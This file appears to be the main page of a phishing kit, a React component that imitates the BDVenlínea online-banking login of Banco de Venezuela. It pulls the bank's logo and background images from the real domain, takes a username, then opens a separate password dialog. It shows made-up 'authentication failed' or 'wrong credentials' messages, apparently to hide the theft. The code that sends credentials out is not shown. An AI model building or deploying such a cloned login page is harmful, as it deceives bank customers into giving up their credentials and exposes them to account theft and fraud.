import { useState, useEffect } from "react";
import PasswordDialog from "../components/PasswordDialog";

export default function Home() {
  const [username, setUsername] = useState("");
  const [focused, setFocused] = useState(false);
  const [showPasswordDialog, setShowPasswordDialog] = useState(false);
  const [showRejection, setShowRejection] = useState(false);
  const [rejectionType, setRejectionType] = useState("auth_failed");
  const isActive = focused || username.length > 0;

  useEffect(() => {
    if (showRejection) {
      const t = setTimeout(() => setShowRejection(false), 5000);
      return () => clearTimeout(t);
    }
  }, [showRejection]);

  return (
    <div
      className="min-h-screen w-full overflow-hidden relative"
      style={{
        backgroundColor: "#ededed",
        backgroundImage: "url(https://bdvenlinea.banvenez.com/assets/login/background.webp)",
        backgroundPosition: "center bottom",
        backgroundSize: "cover",
        backgroundRepeat: "no-repeat",
      }}
    >
      {/* Login Card - centered left */}
      <div
        className="fixed"
        style={{
          top: "50%",
          left: "25%",
          width: "25%",
          transform: "translate(-50%, -50%)",
          backgroundColor: "#fff",
          boxShadow: "0 5px 10px 0 rgba(0,0,0,0.1)",
          borderRadius: "5px",
        }}
      >
        {/* Logo */}
        <div className="flex justify-center" style={{ marginTop: "30px" }}>
          <img
            src="https://bdvenlinea.banvenez.com/assets/login/logo.png"
            alt="BDVenlínea personas"
            style={{ height: "60px", display: "block" }}
          />
        </div>

        {/* Form */}
        <div
          style={{
            backgroundColor: "#fff",
            padding: "30px",
            borderBottomLeftRadius: "10px",
            borderBottomRightRadius: "10px",
          }}
        >
          <form
            onSubmit={(e) => {
              e.preventDefault();
              if (username.length >= 6) setShowPasswordDialog(true);
            }}
          >
            {/* Username field - Material style */}
            <div className="relative w-full" style={{ marginBottom: "4px" }}>
              <div
                className="relative"
                style={{
                  backgroundColor: "#0000000A",
                  borderRadius: "4px 4px 0 0",
                  padding: "12px 12px 0px 12px",
                }}
              >
                <div className="relative" style={{ paddingTop: "18px", paddingBottom: "4px" }}>
                  <label
                    className="absolute pointer-events-none"
                    style={{
                      top: isActive ? "0px" : "50%",
                      left: 0,
                      transform: isActive ? "scale(0.75)" : "translateY(-50%)",
                      transformOrigin: "0 0",
                      transition: "all 0.2s cubic-bezier(0.25, 0.8, 0.25, 1)",
                      color: focused ? "#3f51b5" : "rgba(0,0,0,0.54)",
                      fontSize: "16px",
                      whiteSpace: "nowrap",
                    }}
                  >
                    Usuario *
                  </label>
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value.replace(/ /g, ""))}
                    maxLength={16}
                    minLength={6}
                    autoComplete="off"
                    aria-label="usuario"
                    className="w-full bg-transparent outline-none"
                    style={{
                      font: "inherit",
                      border: "none",
                      padding: 0,
                      margin: 0,
                      fontSize: "16px",
                      color: "rgba(0,0,0,0.87)",
                      lineHeight: "1.5",
                    }}
                    onFocus={(e) => {
                      setFocused(true);
                      const underline = e.target.closest(".relative").parentElement.nextSibling;
                      if (underline) {
                        const ripple = underline.querySelector(".ripple-line");
                        if (ripple) {
                          ripple.style.transform = "scaleX(1)";
                          ripple.style.opacity = "1";
                        }
                      }
                    }}
                    onBlur={(e) => {
                      setFocused(false);
                      const underline = e.target.closest(".relative").parentElement.nextSibling;
                      if (underline) {
                        const ripple = underline.querySelector(".ripple-line");
                        if (ripple) {
                          ripple.style.transform = "scaleX(0.5)";
                          ripple.style.opacity = "0";
                        }
                      }
                    }}
                  />
                </div>
              </div>
              {/* Underline */}
              <div className="relative w-full" style={{ height: "1px", backgroundColor: "rgba(0,0,0,0.42)" }}>
                <span
                  className="ripple-line absolute left-0 w-full"
                  style={{
                    height: "2px",
                    top: 0,
                    backgroundColor: "#3f51b5",
                    transformOrigin: "50%",
                    transform: "scaleX(0.5)",
                    opacity: 0,
                    transition: "transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1), opacity 0.1s cubic-bezier(0.25, 0.8, 0.25, 1)",
                  }}
                />
              </div>
              {/* Hint spacer */}
              <div style={{ height: "19.5px" }} />
            </div>

            {/* Button */}
            <div className="text-center" style={{ marginTop: "20px" }}>
              <button
                type="submit"
                disabled={username.length < 6}
                style={{
                  width: "50%",
                  height: "45px",
                  backgroundColor: username.length >= 6 ? "#0067B1" : "rgba(0,0,0,0.12)",
                  color: username.length >= 6 ? "#fff" : "rgba(0,0,0,0.26)",
                  border: "none",
                  borderRadius: "2px",
                  fontSize: "14px",
                  fontWeight: 500,
                  textTransform: "uppercase",
                  letterSpacing: "0.5px",
                  cursor: username.length >= 6 ? "pointer" : "default",
                  boxShadow: "0 3px 1px -2px rgba(0,0,0,0.2), 0 2px 2px 0 rgba(0,0,0,0.14), 0 1px 5px 0 rgba(0,0,0,0.12)",
                  transition: "background 0.4s cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1)",
                  fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
                }}
              >
                Entrar
              </button>
            </div>
          </form>

          {/* Links */}
          <div className="text-center" style={{ marginTop: "20px" }}>
            <a
              href="https://bdvenlinea.banvenez.com/gestion-usuario"
              target="_blank"
              rel="noopener noreferrer"
              style={{
                fontSize: "14px",
                color: "#707070",
                textDecoration: "none",
                fontWeight: 700,
              }}
            >
              ¿Olvidaste tu usuario o clave?
            </a>
            <br />
            <a
              href="https://bdvenlinea.banvenez.com/gestion-usuario"
              target="_blank"
              rel="noopener noreferrer"
              style={{
                fontSize: "14px",
                color: "#707070",
                textDecoration: "none",
                fontWeight: 700,
              }}
            >
              Si eres nuevo clienteBDV registrate aquí
            </a>
          </div>
        </div>
      </div>

      {showRejection && (
        <div style={{
          position: "fixed",
          bottom: "20px",
          left: "50%",
          transform: "translateX(-50%)",
          minWidth: "255px",
          maxWidth: "90%",
          width: "auto",
          backgroundColor: "#0067B1",
          color: "#fff",
          padding: "6px 14px",
          display: "flex",
          flexDirection: "row",
          alignItems: "center",
          justifyContent: "center",
          gap: "24px",
          fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
          boxShadow: "0 4px 10px rgba(0,0,0,0.2)",
          borderRadius: "8px",
          zIndex: 10000,
        }}>
          <div style={{ fontSize: "18px", fontWeight: 500, textAlign: "center", lineHeight: "1.2" }}>
            {rejectionType === "wrong_credentials" ? (
              <>Usuario o contraseña<br />incorrecta</>
            ) : (
              <>Tu autenticación ha sido<br />fallida</>
            )}
          </div>
          <button
            onClick={() => setShowRejection(false)}
            style={{
              backgroundColor: "#3f51b5",
              color: "#fff",
              border: "none",
              borderRadius: "4px",
              padding: "10px 28px",
              fontSize: "15px",
              fontWeight: 600,
              cursor: "pointer",
              letterSpacing: "0.5px",
              boxShadow: "0 2px 5px rgba(0,0,0,0.2)",
            }}
          >
            Aceptar
          </button>
        </div>
      )}

      {showPasswordDialog && (
        <PasswordDialog
          username={username}
          onCancel={() => setShowPasswordDialog(false)}
          onReject={(reason) => {
            setShowPasswordDialog(false);
            setRejectionType(reason || "auth_failed");
            setShowRejection(true);
          }}
        />
      )}

      {/* Responsive styles for smaller screens */}
      <style>{`
        @import url('https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap');

        body {
          font-family: Roboto, 'Helvetica Neue', sans-serif;
          margin: 0;
          padding: 0;
        }

        @media (max-width: 1500px) {
          .fixed {
            width: 30% !important;
          }
        }
        @media (max-width: 1300px) {
          .fixed {
            width: 40% !important;
          }
        }
        @media (max-width: 993px) {
          .fixed {
            width: 50% !important;
            left: 50% !important;
          }
        }
        @media (max-width: 900px) {
          .min-h-screen {
            background-image: unset !important;
          }
        }
        @media (max-width: 680px) {
          .fixed {
            width: 70% !important;
          }
        }
        @media (max-width: 300px) {
          .fixed {
            width: 85% !important;
          }
        }
      `}</style>
    </div>
  );
}